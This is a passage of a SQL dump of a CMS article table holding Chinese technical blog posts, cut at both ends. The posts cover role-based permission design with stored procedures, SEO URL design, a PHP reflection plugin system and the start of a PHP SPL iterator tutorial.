/&gt;\r\n&lt;br /&gt;\r\n2)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 具有创建角色和删除角色的功能： Administrator&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程CreateRoleInfo（@RoleName,@RoleNote）创建角色信息；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程DeleteRoleInfo(@RoleID)删除角色信息；&lt;br /&gt;\r\n3）Administrator具有建立用户和角色、角色和权限的关联关系功能：&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程GrantUserRole（@UserID,@RoleID,@UserRoleNote）建立用户和角色的关联关系；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程DeleteUserRole(@UserRoleID)删除用户和角色的关联关系；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程GrantRolePermission(@RoleID,@PermissionID,@RolePermissionNote)建立角色和权限的关联关系；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程DeleteRolePermission(@RolePermissionID)删除角色和权限的关联关系；&lt;br /&gt;\r\n第三步用户（User）使用Administrator分配给的权限去使用各个系统模块。利用存储过程GetUserRole（@UserID, @UserRoleID output）,GetRolePermission（@RoleID,@Role-&lt;br /&gt;\r\n-PermissinID output）获得用户对模块的使用权限。&lt;br /&gt;\r\n1.7 用户认证实现&lt;br /&gt;\r\n当用户通过验证后，由系统自动生成一个128位的TicketID保存到用户数据库表中，建立存储过程Login（@UserID,@UserPwd, @TicketID output）进行用户认证，认证通过得到一个TicketID，否则TicketID为null。其流程图如下：&lt;br /&gt;\r\n图1 Login流程图&lt;br /&gt;\r\n得到TicketID后，客户端在调用服务端方法时传递TicketID，通过存储过程JudgeTicketPermission（@TicketID,@PermissionID）判断TicketID对应的用户所具有的权限，并根据其权限进行方法调用。&lt;br /&gt;\r\n当用户退出系统时，建立存储过程Logout（@UserID）来退出系统。当用户异常退出系统时，根据最后的登陆时间（LastSignTime）确定用户的TickeID，建立存储过程ExceptionLogout（@UserID,@LastSignTime）处理用户的异常退出。&lt;br /&gt;\r\n图2 Logout流程图&lt;br /&gt;\r\nWebService可以采用SoapHeader中写入TicketID来使得TicketID从客户端传递给服务端。.Net Remoting可以采用CallContext类来实现TicketID从客户端传递给服务端。&lt;br /&gt;\r\n2 数据库设计&lt;br /&gt;\r\n2.1 数据库表&lt;br /&gt;\r\n图3 数据库关系图&lt;br /&gt;\r\n2.2 数据库表说明&lt;br /&gt;\r\n2.2.1 用户表（Static_User）&lt;br /&gt;\r\nStatic_User&lt;br /&gt;\r\n&lt;br /&gt;\r\nStatic_User字段名&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n详细解释&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n类型&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n备注&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n路线编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nPK&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserName&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户名称&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserPwd&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户密码&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nLastSignTime&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n最后登陆时间&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\ndatatime&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nSignState&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户登陆状态标记&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nint&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nTickeID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n验证票记录编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(128)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n2.2.2 角色表（Static_Role）&lt;br /&gt;\r\nStatic_Role&lt;br /&gt;\r\n&lt;br /&gt;\r\nStatic_User字段名&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n详细解释&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n类型&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n备注&lt;br /&gt;\r\n&lt;br /&gt;\r\nRoleID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n角色编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nPK&lt;br /&gt;\r\n&lt;br /&gt;\r\nRoleName&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n角色名称&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nRoleNote&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n角色信息描述&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n2.2.3 用户－角色表（Static_User_Role）&lt;br /&gt;\r\nStatic_User_Role&lt;br /&gt;\r\n&lt;br /&gt;\r\nStatic_User字段名&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n详细解释&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n类型&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n备注&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserRoleID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户角色编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nPK&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nFK&lt;br /&gt;\r\n&lt;br /&gt;\r\nRoleID&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n角色编号&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nFK&lt;br /&gt;\r\n&lt;br /&gt;\r\nUserRoleNote&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n用户角色信息描述&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nvarchar(20)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n', 1, 1, 0, 0, 1302142207, 1, 'admin'),
(27, 1, 'seo优化之url设计', '', '', 'UEO这个词相信大家也不陌生，中文意思就是用户体验。现在很多网站都注重用户体验，毕竟我们做网站最终是服务于用户，所以我们在网站设计和优化时也要考虑用户体验。用户体验的范围很广，这里主要讲述从用户体验的角度来分析网站的url设计，简单的说，url应该清晰友好，方便记忆。那么我们在网站建设中应该如何去设计url呢?下面就由笔者来讲述url设计的八大原则。&lt;p&gt;　　一、url越简洁越好&lt;/p&gt;\r\n&lt;p&gt;　　我们举个例子来说，假如你看到了一个非常长的url，给你的第一感觉是怎样的?同样，我们的用户面对着冗长的url地址，肯定也会产生厌倦感，甚至可能就直接关闭掉我们的网站。所以，我们的url越简洁越好，而且简短的url也比较容易传播和复制。&lt;/p&gt;\r\n&lt;p&gt;　　二、避免过多的参数&lt;/p&gt;\r\n&lt;p&gt;　　现在很多网站都是动态的，认真的站长朋友们可能会发现，很多的动态url里面参数比较多，这样的url不利于用户体验和网站内容的收录，笔者建议，参数一定要保证在2到3个之内。如果可以使用url静态化，建议还是使用静态化的。&lt;/p&gt;\r\n&lt;p&gt;　　三、目录层次尽量少&lt;/p&gt;\r\n&lt;p&gt;　　目录层次是与一个网站的分类息息相关的，如果网站的分类过多，那么网站url的目录层次也就多起来了。经过分析，百度还是比较喜欢目录层次较少的页面，一般网站保证层次在三个以内就够了，不能过多，否则也不利于搜索引擎蜘蛛的爬去，从而影响网站内容的收录。&lt;/p&gt;\r\n&lt;p&gt;　　四、url中包含关键字&lt;/p&gt;\r\n&lt;p&gt;　　关键字在url中，能够提高页面的相关性，而且能在排名时贡献一点分数。经过分析，关键字一般出现在域名中是比较好的，如果域名中未能包含关键字，那么我们可以通过分类层次命名中来包含关键字，虽然作用较小，但是还是有一定作用的。但是不要出现关键字堆积的嫌疑。&lt;/p&gt;\r\n&lt;p&gt;　　五、字母应为小写&lt;/p&gt;\r\n&lt;p&gt;　　这里很多人可能会问搜索引擎区分大小写吗?虽然说搜索引擎区不区分大小写还有待考证，但是我们如果做的话，笔者还是建议大家全部统一为小写，用户浏览起来看着也舒服，而且当用户需要手动输入url时耶不容易出错。&lt;/p&gt;\r\n&lt;p&gt;　　六、连词符使用&lt;/p&gt;\r\n&lt;p&gt;　　url单词间，我们一般采用短横线(-)来分隔，不要使用其他的符号来分隔。我们在写网站标题的时候经常会用到短横线符号，这个是什么呢?相信大家都应该明白。搜索引擎能将url中的短横线当做空格处理，而下划线则容易被忽略。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302143765, 1, 'admin'),
(28, 1, 'PHP反射机制实现插件的可插拔设计', '', '', '&lt;div&gt;&lt;strong&gt;功能描述：&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;页面拥有一个主导航菜单，里头有默认连接若干。&lt;br /&gt;\r\n插件统一存放在一个目录，插件载入后会自动在导航菜单中增加上自己所需的链接。&lt;br /&gt;\r\n插件载入时可执行一定的操作。&lt;br /&gt;\r\n动态增删插件无需改动代码。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;最终效果：&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;首页，插件1，插件2&lt;br /&gt;\r\n“首页”是系统自带的菜单项。“插件1”和“插件2”是由插件注册的菜单项。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;实现过程：&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;1. 文件结构&lt;/strong&gt;&lt;br /&gt;\r\n&lt;span style=&quot;font-size:x-small;&quot;&gt;&lt;font size=&quot;1&quot;&gt;Learn&lt;br /&gt;\r\nplugin&lt;br /&gt;\r\nplugin1.php&lt;br /&gt;\r\nplugin2.php&lt;br /&gt;\r\ntest.php&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;\r\n&lt;div&gt;如此设计后，页面入口为test.php，插件都存放在plugin目录下，只要遍历plugin目录就可以找到所有的插件了。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;2. 设计插件接口&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;interface IPlugin{&lt;br /&gt;\r\nstatic function getname();&lt;br /&gt;\r\nstatic function init();&lt;br /&gt;\r\nstatic function getMenu();&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;3. 插件内部实现接口&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;Plugin1实现接口：&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;&amp;lt;?php&lt;br /&gt;\r\nClass Welcome implements IPlugin{&lt;br /&gt;\r\nstatic function getname(){&lt;br /&gt;\r\nreturn ‘Welcome (Plugin)’;&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;static function getMenu(){&lt;br /&gt;\r\nreturn array(&lt;br /&gt;\r\n‘text’=&amp;gt;’插件1′,&lt;br /&gt;\r\n‘href’=&amp;gt;’http://www.google.com’&lt;br /&gt;\r\n);&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;static function init(){&lt;br /&gt;\r\necho self::getname() . ” 载入中…&amp;lt;br /&amp;gt;”;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;Plugin2实现接口：&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;&amp;lt;?php&lt;br /&gt;\r\nClass ShowAD implements IPlugin{&lt;br /&gt;\r\nstatic function getname(){&lt;br /&gt;\r\nreturn ‘Show AD (Plugin)’;&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;static function getMenu(){&lt;br /&gt;\r\nreturn array(&lt;br /&gt;\r\n‘text’=&amp;gt;’插件2′,&lt;br /&gt;\r\n‘href’=&amp;gt;’http://www.live.com’&lt;br /&gt;\r\n);&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;static function init(){&lt;br /&gt;\r\necho self::getname() . ” 载入中…&amp;lt;br /&amp;gt;”;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;4. 主页面初始化主导航菜单&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;$menu[] = array(&lt;br /&gt;\r\n‘text’=&amp;gt;’首页’,&lt;br /&gt;\r\n‘href’=&amp;gt;’/test.php’&lt;br /&gt;\r\n);&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;5. 遍历插件目录，载入全部插件&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;$pluginPath = $_SERVER[''DOCUMENT_ROOT''] . ‘/plugin’;&lt;/div&gt;\r\n&lt;div&gt;$dirHd = opendir($pluginPath);&lt;br /&gt;\r\nwhile ($file = readdir($dirHd)){&lt;br /&gt;\r\n$pluginFilePath = $pluginPath . ‘/’ . $file;&lt;br /&gt;\r\nif($file!=’.’ &amp;amp;&amp;amp; $file!=’..’ &amp;amp;&amp;amp; is_file($pluginFilePath)){&lt;br /&gt;\r\ninclude “$pluginFilePath”;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;6. 过滤出实现了IPlugin接口的插件，并执行插件注入操作。&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;// 反射执行方法(注入菜单)&lt;br /&gt;\r\nforeach (get_declared_classes() as $class){&lt;br /&gt;\r\n$refClass = new ReflectionClass($class);&lt;br /&gt;\r\nif($refClass-&amp;gt;implementsInterface(‘IPlugin’)){&lt;br /&gt;\r\n//插件初始化&lt;br /&gt;\r\n$refClass-&amp;gt;getMethod(‘init’)-&amp;gt;invoke(null);&lt;br /&gt;\r\n//获取注入菜单&lt;br /&gt;\r\n$menuItem = $refClass-&amp;gt;getMethod(‘getMenu’)-&amp;gt;invoke(null);&lt;br /&gt;\r\n//合并菜单项&lt;br /&gt;\r\n$menu = array_merge($menu, array($menuItem));&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;7. 主页面输出菜单HTML&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;foreach ($menu as $m){&lt;br /&gt;\r\necho “&amp;lt;a href=’{$m[''href'']}’&amp;gt;{$m[''text'']}&amp;lt;/a&amp;gt; “;&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;div&gt;注意第6部就是PHP的反射操作，是不是很简单呢。分析下其中代码，一个完整的反射操作时机只有2行代码！&lt;/div&gt;\r\n&lt;div lang=&quot;php&quot;&gt;$refClass = new ReflectionClass($class);&lt;br /&gt;\r\n$menuItem = $refClass-&amp;gt;getMethod(‘getMenu’)-&amp;gt;invoke(null);&lt;/div&gt;\r\n&lt;div&gt;好了，反射的基本功能就介绍到这了。当然了，PHP的反射功能不仅仅如此，有兴趣的自己发掘去吧。&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302184670, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(29, 1, 'PHP SPL详解', '', '', '&lt;div class=&quot;showContent&quot;&gt;&lt;div&gt;&lt;strong&gt;PHP SPL笔记&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;目录&lt;/div&gt;\r\n&lt;div&gt;第一部分 简介&lt;/div&gt;\r\n&lt;div&gt;1. 什么是SPL？&lt;/div&gt;\r\n&lt;div&gt;2. 什么是Iterator？&lt;/div&gt;\r\n&lt;div&gt;第二部分 SPL Interfaces&lt;/div&gt;\r\n&lt;div&gt;3. Iterator界面&lt;/div&gt;\r\n&lt;div&gt;4. ArrayAccess界面&lt;/div&gt;\r\n&lt;div&gt;5. IteratorAggregate界面&lt;/div&gt;\r\n&lt;div&gt;6. RecursiveIterator界面&lt;/div&gt;\r\n&lt;div&gt;7. SeekableIterator界面&lt;/div&gt;\r\n&lt;div&gt;8. Countable界面&lt;/div&gt;\r\n&lt;div&gt;第三部分 SPL Classes&lt;/div&gt;\r\n&lt;div&gt;9. SPL的内置类&lt;/div&gt;\r\n&lt;div&gt;10. DirectoryIterator类&lt;/div&gt;\r\n&lt;div&gt;11. ArrayObject类&lt;/div&gt;\r\n&lt;div&gt;12. ArrayIterator类&lt;/div&gt;\r\n&lt;div&gt;13. RecursiveArrayIterator类和RecursiveIteratorIterator类&lt;/div&gt;\r\n&lt;div&gt;14. FilterIterator类&lt;/div&gt;\r\n&lt;div&gt;15. SimpleXMLIterator类&lt;/div&gt;\r\n&lt;div&gt;16. CachingIterator类&lt;/div&gt;\r\n&lt;div&gt;17. LimitIterator类&lt;/div&gt;\r\n&lt;div&gt;18. SplFileObject类&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;第一部 简介&lt;/strong&gt;&lt;/div&gt;\r\n&lt;strong&gt;1. 什么是SPL？&lt;/strong&gt; &lt;div&gt;SPL是Standard PHP Library（PHP标准库）的缩写。&lt;/div&gt;\r\n&lt;div&gt;根据官方定义，它是“a collection of interfaces and classes that are meant to solve standard problems”。但是，目前在使用中，SPL更多地被看作是一种使object（物体）模仿array（数组）行为的interfaces和 classes。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;2. 什么是Iterator？&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;SPL的核心概念就是Iterator。这指的是一种Design Pattern，根据《Design Patterns》一书的定义，Iterator的作用是“provide an object which traverses some aggregate structure, abstracting away assumptions about the implementation of that structure.”&lt;/div&gt;\r\n&lt;div&gt;wikipedia中说，&quot;an iterator is an object which allows a programmer to traverse through all the elements of a collection, regardless of its specific implementation&quot;.……&quot;the iterator pattern is a design pattern in which iterators are used to access the elements of an aggregate object sequentially without exposing its underlying representation&quot;.&lt;/div&gt;\r\n&lt;div&gt;通俗地说，Iterator能够使许多不同的数据结构，都能有统一的操作界面，比如一个数据库的结果集、同一个目录中的文件集、或者一个文本中每一行构成的集合。&lt;/div&gt;\r\n&lt;div&gt;如果按照普通情况，遍历一个MySQL的结果集，程序需要这样写：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Fetch the &quot;aggregate structure&quot;&lt;br /&gt;\r\n$result = mysql_query(&quot;SELECT * FROM users&quot;);&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Iterate over the structure&lt;br /&gt;\r\nwhile ( $row = mysql_fetch_array($result) ) {&lt;br /&gt;\r\n   // do stuff with the row here&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;读出一个目录中的内容，需要这样写：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Fetch the &quot;aggregate structure&quot;&lt;br /&gt;\r\n$dh = opendir(''/home/harryf/files'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Iterate over the structure&lt;br /&gt;\r\nwhile ( $file = readdir($dh) ) {&lt;br /&gt;\r\n   // do stuff with the file here&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;读出一个文本文件的内容，需要这样写：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Fetch the &quot;aggregate structure&quot;&lt;br /&gt;\r\n$fh = fopen(&quot;/home/hfuecks/files/results.txt&quot;, &quot;r&quot;);&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Iterate over the structure&lt;br /&gt;\r\nwhile (!feof($fh)) {&lt;br /&gt;\r\n&lt;br /&gt;\r\n   $line = fgets($fh);&lt;br /&gt;\r\n   // do stuff with the line here&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;上面三段代码，虽然处理的是不同的resource（资源），但是功能都是遍历结果集（loop over contents），因此Iterator的基本思想，就是将这三种不同的操作统一起来，用同样的命令界面，处理不同的资源。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;第二部分 SPL Interfaces&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;3. Iterator界面&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;SPL规定，所有部署了Iterator界面的class，都可以用在foreach Loop中。Iterator界面中包含5个必须部署的方法：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;    * current()&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method returns the current index’s value. You are solely&lt;br /&gt;\r\n      responsible for tracking what the current index is as the &lt;br /&gt;\r\n     interface does not do this for you.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * key()&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method returns the value of the current index’s key. For &lt;br /&gt;\r\n      foreach loops this is extremely important so that the key &lt;br /&gt;\r\n      value can be populated.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * next()&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method moves the internal index forward one entry.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * rewind()&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method should reset the internal index to the first element.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * valid()&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method should return true or false if there is a current &lt;br /&gt;\r\n      element. It is called after rewind() or next().&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;下面就是一个部署了Iterator界面的class示例：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;/**&lt;br /&gt;\r\n* An iterator for native PHP arrays, re-inventing the wheel&lt;br /&gt;\r\n*&lt;br /&gt;\r\n* Notice the &quot;implements Iterator&quot; - important!&lt;br /&gt;\r\n*/&lt;br /&gt;\r\nclass ArrayReloaded implements Iterator {&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * A native PHP array to iterate over&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n private $array = array();&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * A switch to keep track of the end of the array&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n private $valid = FALSE;&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Constructor&lt;br /&gt;\r\n   * @param array native PHP array to iterate over&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function __construct($array) {&lt;br /&gt;\r\n   $this-&amp;gt;array = $array;&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Return the array &quot;pointer&quot; to the first element&lt;br /&gt;\r\n   * PHP''s reset() returns false if the array has no elements&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function rewind(){&lt;br /&gt;\r\n   